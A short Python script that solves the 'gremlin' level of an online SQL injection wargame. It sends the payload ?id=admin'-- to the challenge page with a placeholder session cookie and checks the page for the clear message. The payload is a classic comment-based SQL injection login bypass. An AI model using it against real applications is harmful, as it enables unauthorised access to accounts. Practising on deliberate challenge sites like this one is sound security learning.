import requests

url = 'https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php'
cookie = {'PHPSESSID': 'your cookie'}
payload = "?id=admin'-- "

r = requests.get(url + payload, cookies=cookie)
if 'GREMLIN Clear!' in r.text:
    print('GREMLIN Clear!')
